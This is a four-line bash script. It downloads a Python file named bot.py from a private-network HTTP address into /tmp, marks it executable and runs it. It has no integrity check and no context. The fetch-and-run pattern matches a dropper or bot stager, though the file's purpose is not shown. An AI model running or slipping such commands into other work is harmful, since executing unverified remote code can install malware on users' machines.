#!/bin/bash

wget http://10.1.5.54/bot.py --output-document /tmp/bot.py
chmod 755 /tmp/bot.py
python3 /tmp/bot.py
